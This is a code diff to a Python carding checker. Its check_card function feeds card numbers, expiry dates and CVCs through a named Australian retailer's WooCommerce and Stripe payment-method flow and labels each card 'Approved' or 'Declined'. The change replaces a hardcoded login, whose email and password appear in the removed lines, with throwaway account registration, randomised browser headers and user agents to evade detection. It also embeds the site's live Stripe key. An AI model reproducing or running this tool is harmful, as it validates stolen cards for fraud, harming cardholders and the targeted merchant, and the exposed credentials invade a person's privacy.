@@ -2,7 +2,18 @@ import requests
 import random
 import re
 import json
-import uuid
+import time
+import string
+
+def generate_random_email():
+    """Generate a random email address"""
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
+    return f"{username}@{domain}"
+
+def generate_random_password():
+    """Generate a random password"""
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
 
 def check_card(ccx):
     try:
@@ -13,89 +24,199 @@ def check_card(ccx):
 
         n, mm, yy, cvc = parts
 
+        # Create a session
         session = requests.Session()
+
+        # Generate random credentials for each request
+        email = generate_random_email()
+        password = generate_random_password()
+
+        # Random user-agent
         user_agents = [
             "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
         ]
-        user_agent = random.choice(user_agents)
+        random_user_agent = random.choice(user_agents)
 
-        # Step 1: Login
-        resp = session.get("https://thefloordepot.com.au/my-account/", headers={'user-agent': user_agent})
-        match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', resp.text)
-        if not match:
-            return {"cc": ccx, "response": "Nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
-        nonce = match.group(1)
-
-        login_data = {
-            "username": "frabsok@gmail.com",
-            "password": "Sh@7380046305",
-            "rememberme": "forever",
-            "woocommerce-login-nonce": nonce,
-            "_wp_http_referer": "/my-account/",
-            "login": "Log in",
+        # Step 1: Get the registration page to extract nonce
+        headers = {
+            'authority': 'thefloordepot.com.au',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'priority': 'u=0, i',
+            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': random_user_agent,
         }
-        session.post("https://thefloordepot.com.au/my-account/", data=login_data, headers={'user-agent': user_agent})
 
-        # Step 2: Get add_card_nonce
-        resp = session.get("https://thefloordepot.com.au/my-account/add-payment-method/", headers={'user-agent': user_agent})
-        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', resp.text)
+        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
+        
+        # Extract registration nonce
+        match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', response.text)
+        if not match:
+            return {"cc": ccx, "response": "Registration nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
+        
+        register_nonce = match.group(1)
+
+        # Step 2: Register a new account
+        headers = {
+            'authority': 'thefloordepot.com.au',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://thefloordepot.com.au',
+            'priority': 'u=0, i',
+            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': random_user_agent,
+        }
+
+        data = {
+            'email': email,
+            'password': password,
+            'woocommerce-register-nonce': register_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'register': 'Register',
+        }
+
+        response = session.post('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers, data=data)
+        
+        # Check if registration was successful
+        if 'my-account/add-payment-method' not in response.url:
+            return {"cc": ccx, "response": "Account registration failed", "status": "Declined", "gateway": "Stripe Auth"}
+
+        # Step 3: Get the add payment method page to extract add_card_nonce
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
+            'Pragma': 'no-cache',
+            'Referer': 'https://thefloordepot.com.au/my-account/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': random_user_agent,
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+        }
+
+        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
+
+        # Extract add_card_nonce
+        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
         if not match:
             return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
+
         add_card_nonce = match.group(1)
 
-        # Step 3: Create Stripe source
-        stripe_data = {
-            "referrer": "https://thefloordepot.com.au",
-            "type": "card",
-            "owner[name]": "+",
-            "owner[email]": "frabsok@gmail.com",
-            "card[number]": n,
-            "card[cvc]": cvc,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "guid": uuid.uuid4().hex,
-            "muid": uuid.uuid4().hex,
-            "sid": uuid.uuid4().hex,
-            "payment_user_agent": "stripe.js/ stripe-js-v3/ split-card-element",
-            "time_on_page": str(1000),
-            "key": "pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq"
+        # Step 4: Create Stripe source
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'priority': 'u=1, i',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': random_user_agent,
         }
-        resp = session.post("https://api.stripe.com/v1/sources", data=stripe_data, headers={'user-agent': user_agent})
-        stripe_resp = resp.json()
 
-        if "error" in stripe_resp:
-            error_code = stripe_resp["error"].get("code")
-            error_message = stripe_resp["error"].get("message", "Unknown Stripe error")
-            if error_code == "card_declined":
+        # Generate random IDs for Stripe
+        guid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
+        muid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
+        sid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
+
+        data = f'referrer=https%3A%2F%2Fthefloordepot.com.au&type=card&owner[name]=+&owner[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+split-card-element&time_on_page={random.randint(60000, 70000)}&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
+
+        response = session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
+        stripe_response = response.json()
+
+        if 'error' in stripe_response:
+            error_code = stripe_response['error']['code']
+            error_message = stripe_response['error']['message']
+            if error_code == 'card_declined':
                 return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe Auth"}
             return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe Auth"}
 
-        source_id = stripe_resp.get("id")
-        if not source_id:
+        id = stripe_response.get('id', '')
+        if not id:
             return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe Auth"}
 
-        # Step 4: Attach source to WooCommerce setup intent
-        setup_resp = session.post(
-            "https://thefloordepot.com.au/",
-            params={"wc-ajax": "wc_stripe_create_setup_intent"},
-            data={"stripe_source_id": source_id, "nonce": add_card_nonce},
-            headers={'user-agent': user_agent, 'X-Requested-With': 'XMLHttpRequest'}
-        )
+        # Step 5: Create setup intent
+        headers = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://thefloordepot.com.au',
+            'Pragma': 'no-cache',
+            'Referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': random_user_agent,
+            'X-Requested-With': 'XMLHttpRequest',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+        }
 
+        params = {
+            'wc-ajax': 'wc_stripe_create_setup_intent',
+        }
+
+        data = {
+            'stripe_source_id': id,
+            'nonce': add_card_nonce,
+        }
+
+        response = session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
+        
         try:
-            setup_data = setup_resp.json()
+            setup_data = response.json()
         except json.JSONDecodeError:
             return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe Auth"}
 
-        status = setup_data.get("data", {}).get("status")
-        if status == "requires_action":
-            return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
-        elif status == "succeeded":
-            return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
-        elif "error" in setup_data.get("data", {}):
-            error_msg = setup_data["data"]["error"].get("message", "Unknown error")
+        if setup_data.get('success', False):
+            data_status = setup_data['data'].get('status')
+            if data_status == 'requires_action':
+                return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
+            elif data_status == 'succeeded':
+                return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
+            elif 'error' in setup_data['data']:
+                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
+                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
+
+        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
+            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
             return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}
 
         return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth"}
